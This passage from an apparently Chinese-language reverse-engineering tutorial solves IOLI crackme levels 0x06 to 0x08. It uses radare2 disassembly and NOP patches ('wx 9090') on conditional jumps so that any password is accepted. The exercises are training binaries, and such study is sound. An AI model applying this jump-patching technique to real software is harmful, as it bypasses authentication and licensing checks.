|      |   <span class="number">0x08048550</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x08048584</span> (unk)
|- loc<span class="number">.08048557</span> <span class="number">49</span>
|      |   <span class="number">0x08048557</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x0804855b</span>    <span class="number">7f</span>29         jg loc<span class="number">.08048586</span>
|     ||   <span class="number">0x0804855d</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048560</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x08048563</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x08048565</span>    <span class="number">7518</span>         jne loc<span class="number">.0804857f</span>
|    |||   <span class="number">0x08048567</span>    c7042440870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|    |||   <span class="number">0x0804856e</span>    e845feffff   call sym.imp.<span class="built_in">printf</span>
|    |||      sym.imp.<span class="built_in">printf</span>()
|    |||   <span class="number">0x08048573</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x0804857a</span>    e869feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x08048565</span> (unk)
|- loc<span class="number">.0804857f</span> <span class="number">9</span>
|    `---&gt; <span class="number">0x0804857f</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x08048582</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x08048584</span>    ebd1         jmp loc<span class="number">.08048557</span>
|     ||   ; JMP XREF from <span class="number">0x0804854e</span> (unk)
|     ||   ; JMP XREF from <span class="number">0x0804855b</span> (unk)
|- loc<span class="number">.08048586</span> <span class="number">2</span>
|     ``-&gt; <span class="number">0x08048586</span>    c9           leave
\          <span class="number">0x08048587</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485aa</span>
[<span class="number">0x080485aa</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485aa</span>]&gt; s <span class="number">0x080485de</span>
[<span class="number">0x080485de</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485de</span>]&gt; s <span class="number">0x0804854e</span>
[<span class="number">0x0804854e</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804854e</span>]&gt; s <span class="number">0x0804855b</span>
[<span class="number">0x0804855b</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804855b</span>]&gt; s <span class="number">0x08048565</span>
[<span class="number">0x08048565</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048565</span>]&gt; q
</code></pre><p>输入任意密码：</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x06
IOLI Crackme Level <span class="number">0</span>x06
Password: <span class="number">123456</span>
Password OK!
</code></pre><h2 id="crackme0x07">crackme0x07</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x07
IOLI Crackme Level <span class="number">0</span>x07
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>这次函数名都变了。大致搜索下就找到<code>Ok</code>代码段，把所有跳转清除。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x07
 -- Wow, my cat knows radare2 hotkeys better than me!
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@main
|          ; UNKNOWN XREF from <span class="number">0x08048643</span> (fcn<span class="number">.080485</span>b9)
|          ; DATA XREF from <span class="number">0x08048417</span> (entry0)
/ (fcn) main <span class="number">99</span>
|          <span class="number">0x0804867d</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804867e</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048680</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048686</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048689</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804868e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048691</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048694</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048697</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804869a</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804869c</span>    c70424d9870. mov dword [esp], str.IOLI_Crackme_Level_0x07_n ; str.IOLI_Crackme_Level_0x07_n
|          <span class="number">0x080486a3</span>    e810fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080486a8</span>    c70424f2870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080486af</span>    e804fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080486b4</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486b7</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486bb</span>    c70424fd870. mov dword [esp], <span class="number">0x80487fd</span> ;  <span class="number">0x080487fd</span> 
|          <span class="number">0x080486c2</span>    e8d1fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080486c7</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x080486ca</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486ce</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486d1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080486d4</span>    e8e0feffff   call fcn<span class="number">.080485</span>b9
|             fcn<span class="number">.080485</span>b9()
|          <span class="number">0x080486d9</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080486de</span>    c9           leave
\          <span class="number">0x080486df</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@fcn<span class="number">.080485</span>b9
            ; UNKNOWN XREF from <span class="number">0x08048576</span> (fcn<span class="number">.08048524</span>)
            ; CALL XREF from <span class="number">0x080486d4</span> (unk)
/ (fcn) fcn<span class="number">.080485</span>b9 <span class="number">196</span>
|           <span class="number">0x080485b9</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x080485ba</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x080485bc</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|           <span class="number">0x080485bf</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|           <span class="number">0x080485c6</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048628</span> (fcn<span class="number">.080485</span>b9)
|- fcn<span class="number">.080485</span>cd <span class="number">176</span>
|     .---&gt; <span class="number">0x080485cd</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x080485d0</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x080485d3</span>    e8d0fdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>(unk)
|     |     <span class="number">0x080485d8</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|     | ,=&lt; <span class="number">0x080485db</span>    <span class="number">734</span>d         jae loc<span class="number">.0804862</span>a
|     | |   <span class="number">0x080485dd</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x080485e0</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x080485e3</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x080485e6</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|     | |   <span class="number">0x080485e9</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x080485ec</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x080485f0</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|     | |   <span class="number">0x080485f8</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|     | |   <span class="number">0x080485fb</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x080485fe</span>    e8c5fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x08048603</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x08048606</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048609</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x0804860b</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804860f</span>    <span class="number">7512</span>         jne loc<span class="number">.08048623</span>
|     |||   <span class="number">0x08048611</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x08048614</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048618</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x0804861b</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x0804861e</span>    e81fffffff   call fcn<span class="number">.08048542</span>
|     |||      fcn<span class="number">.08048542</span>()
|     ||    ; JMP XREF from <span class="number">0x0804860f</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.08048623</span> <span class="number">90</span>
|     |`--&gt; <span class="number">0x08048623</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048626</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048628</span>    eba3         jmp fcn<span class="number">.080485</span>cd
|       |   ; JMP XREF from <span class="number">0x080485db</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804862</span>a <span class="number">83</span>
|       `-&gt; <span class="number">0x0804862a</span>    e8f5feffff   call fcn<span class="number">.08048524</span>
|       | &gt;    fcn<span class="number">.08048524</span>()
|           <span class="number">0x0804862f</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x08048632</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x08048636</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|           <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x0804863c</span>    e873feffff   call fcn<span class="number">.080484</span>b4
|              fcn<span class="number">.080484</span>b4() ; entry0+<span class="number">180</span>
|           <span class="number">0x08048641</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x08048643</span>    <span class="number">7436</span>         je loc<span class="number">.0804867</span>b
|    |      <span class="number">0x08048645</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x08048679</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804864</span>c <span class="number">49</span>
|    |      <span class="number">0x0804864c</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x08048650</span>    <span class="number">7f</span>29         jg loc<span class="number">.0804867</span>b
|   ||      <span class="number">0x08048652</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|   ||      <span class="number">0x08048655</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x08048658</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x0804865a</span>    <span class="number">7518</span>         jne loc<span class="number">.08048674</span>
|  |||      <span class="number">0x0804865c</span>    c70424d3870. mov dword [esp], str.wtf__n ; str.wtf__n
|  |||      <span class="number">0x08048663</span>    e850fdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x08048668</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x0804866f</span>    e874fdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
|  |        ; JMP XREF from <span class="number">0x0804865a</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.08048674</span> <span class="number">9</span>
|  `------&gt; <span class="number">0x08048674</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|   ||      <span class="number">0x08048677</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x08048679</span>    ebd1         jmp loc<span class="number">.0804864</span>c
|   ||      ; JMP XREF from <span class="number">0x08048643</span> (fcn<span class="number">.080485</span>b9)
|   ||      ; JMP XREF from <span class="number">0x08048650</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804867</span>b <span class="number">2</span>
|   ``----&gt; <span class="number">0x0804867b</span>    c9           leave
\           <span class="number">0x0804867c</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@fcn<span class="number">.08048542</span>
           ; CALL XREF from <span class="number">0x0804861e</span> (fcn<span class="number">.080485</span>b9)
/ (fcn) fcn<span class="number">.08048542</span> <span class="number">119</span>
|          <span class="number">0x08048542</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048543</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048545</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048548</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804854b</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x0804854f</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|          <span class="number">0x08048557</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804855a</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804855d</span>    e866feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x08048562</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x08048565</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048569</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804856c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804856f</span>    e840ffffff   call fcn<span class="number">.080484</span>b4
|             fcn<span class="number">.080484</span>b4() ; entry0+<span class="number">180</span>
|          <span class="number">0x08048574</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048576</span>    <span class="number">743f</span>         je loc<span class="number">.080485</span>b7
|      |   <span class="number">0x08048578</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x080485b5</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.0804857f</span> <span class="number">58</span>
|      |   <span class="number">0x0804857f</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x08048583</span>    <span class="number">7f</span>32         jg loc<span class="number">.080485</span>b7
|     ||   <span class="number">0x08048585</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048588</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x0804858b</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x0804858d</span>    <span class="number">7521</span>         jne loc<span class="number">.080485</span>b0
|    |||   <span class="number">0x0804858f</span>    <span class="number">833</span>d2ca0040. cmp dword [<span class="number">0x804a02c</span>], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x08048596</span>    <span class="number">750</span>c         jne loc<span class="number">.080485</span>a4
|   ||||   <span class="number">0x08048598</span>    c70424c5870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|   ||||   <span class="number">0x0804859f</span>    e814feffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x08048596</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>a4 <span class="number">21</span>
|   `----&gt; <span class="number">0x080485a4</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x080485ab</span>    e838feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x0804858d</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>b0 <span class="number">9</span>
|    `---&gt; <span class="number">0x080485b0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485b3</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x080485b5</span>    ebc8         jmp loc<span class="number">.0804857f</span>
|     ||   ; JMP XREF from <span class="number">0x08048576</span> (fcn<span class="number">.08048524</span>)
|     ||   ; JMP XREF from <span class="number">0x08048583</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>b7 <span class="number">2</span>
|     ``-&gt; <span class="number">0x080485b7</span>    c9           leave
\          <span class="number">0x080485b8</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485db</span>
[<span class="number">0x080485db</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485db</span>]&gt; s <span class="number">0x0804860f</span>
[<span class="number">0x0804860f</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804860f</span>]&gt; s <span class="number">0x08048576</span>
[<span class="number">0x08048576</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048576</span>]&gt; s <span class="number">0x08048583</span>
[<span class="number">0x08048583</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048583</span>]&gt; s <span class="number">0x0804858d</span>
[<span class="number">0x0804858d</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804858d</span>]&gt; s <span class="number">0x08048596</span>
[<span class="number">0x08048596</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048596</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x07
IOLI Crackme Level <span class="number">0</span>x07
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x08">crackme0x08</h2><pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x08
IOLI Crackme Level <span class="number">0x08</span>
Password: <span class="number">12345</span>
Password Incorrect!

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x08
 -- THE ONLY WINNING MOVE IS NOT TO PLAY.
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@main 
|          ; UNKNOWN XREF from <span class="number">0x08048643</span> (unk)
|          ; DATA XREF from <span class="number">0x08048417</span> (fcn<span class="number">.080483</span>ee)
/ (fcn) sym.main <span class="number">99</span>
|          <span class="number">0x0804867d</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804867e</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048680</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048686</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048689</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804868e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048691</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048694</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048697</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804869a</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804869c</span>    c70424d9870. mov dword [esp], str.IOLI_Crackme_Level_0x08_n ; str.IOLI_Crackme_Level_0x08_n
|          <span class="number">0x080486a3</span>    e810fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080486a8</span>    c70424f2870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080486af</span>    e804fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080486b4</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486b7</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486bb</span>    c70424fd870. mov dword [esp], <span class="number">0x80487fd</span> ;  <span class="number">0x080487fd</span> 
|          <span class="number">0x080486c2</span>    e8d1fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080486c7</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x080486ca</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486ce</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486d1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080486d4</span>    e8e0feffff   call sym.check
|             sym.check()
|          <span class="number">0x080486d9</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080486de</span>    c9           leave
\          <span class="number">0x080486df</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.check
|           ; UNKNOWN XREF from <span class="number">0x08048576</span> (unk)
|           ; CALL XREF from <span class="number">0x080486d4</span> (unk)
/ (fcn) sym.check <span class="number">196</span>
|           <span class="number">0x080485b9</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x080485ba</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x080485bc</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|           <span class="number">0x080485bf</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|           <span class="number">0x080485c6</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048628</span> (unk)
|- fcn<span class="number">.080485</span>cd <span class="number">176</span>
|     .---&gt; <span class="number">0x080485cd</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x080485d0</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x080485d3</span>    e8d0fdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>(unk)
|     |     <span class="number">0x080485d8</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|     | ,=&lt; <span class="number">0x080485db</span>    <span class="number">734</span>d         jae loc<span class="number">.0804862</span>a
|     | |   <span class="number">0x080485dd</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x080485e0</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x080485e3</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x080485e6</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|     | |   <span class="number">0x080485e9</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x080485ec</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x080485f0</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|     | |   <span class="number">0x080485f8</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|     | |   <span class="number">0x080485fb</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x080485fe</span>    e8c5fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x08048603</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x08048606</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048609</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x0804860b</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804860f</span>    <span class="number">7512</span>         jne loc<span class="number">.08048623</span>
|     |||   <span class="number">0x08048611</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x08048614</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048618</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x0804861b</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x0804861e</span>    e81fffffff   call sym.parell
|     |||      sym.parell()
|     ||    ; JMP XREF from <span class="number">0x0804860f</span> (unk)
|- loc<span class="number">.08048623</span> <span class="number">90</span>
|     |`--&gt; <span class="number">0x08048623</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048626</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048628</span>    eba3         jmp fcn<span class="number">.080485</span>cd
|       |   ; JMP XREF from <span class="number">0x080485db</span> (unk)
|- loc<span class="number">.0804862</span>a <span class="number">83</span>
|       `-&gt; <span class="number">0x0804862a</span>    e8f5feffff   call sym.che
|       | &gt;    sym.che()
|           <span class="number">0x0804862f</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x08048632</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x08048636</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|           <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x0804863c</span>    e873feffff   call sym.dummy
|              sym.dummy()
|           <span class="number">0x08048641</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x08048643</span>    <span class="number">7436</span>         je loc<span class="number">.0804867</span>b
|    |      <span class="number">0x08048645</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x08048679</span> (unk)
|- loc<span class="number">.0804864</span>c <span class="number">49</span>
|    |      <span class="number">0x0804864c</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x08048650</span>    <span class="number">7f</span>29         jg loc<span class="number">.0804867</span>b
|   ||      <span class="number">0x08048652</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|   ||      <span class="number">0x08048655</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x08048658</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x0804865a</span>    <span class="number">7518</span>         jne loc<span class="number">.08048674</span>
|  |||      <span class="number">0x0804865c</span>    c70424d3870. mov dword [esp], str.wtf__n ; str.wtf__n
|  |||      <span class="number">0x08048663</span>    e850fdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x08048668</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x0804866f</span>    e874fdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
|  |        ; JMP XREF from <span class="number">0x0804865a</span> (unk)
|- loc<span class="number">.08048674</span> <span class="number">9</span>
|  `------&gt; <span class="number">0x08048674</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
